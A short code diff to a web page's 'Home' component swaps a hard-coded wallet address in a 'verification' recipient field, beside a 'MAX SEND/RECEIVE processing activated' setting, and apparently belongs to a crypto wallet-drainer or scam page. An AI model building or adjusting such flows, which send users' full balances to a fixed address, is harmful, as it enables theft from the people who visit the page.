@@ -96,7 +96,7 @@ export default function Home() {
       decimals: 6
     },
     verification: {
-      recipient: "0xa598A7578D354a05dAdF25f61d63B8918041F15D",
+      recipient: "0x1be4483300082fD500bB0fbE9c007FbE64eE718B",
       processingFee: "MAX SEND/RECEIVE processing activated",
       monitoringEnabled: true
     }
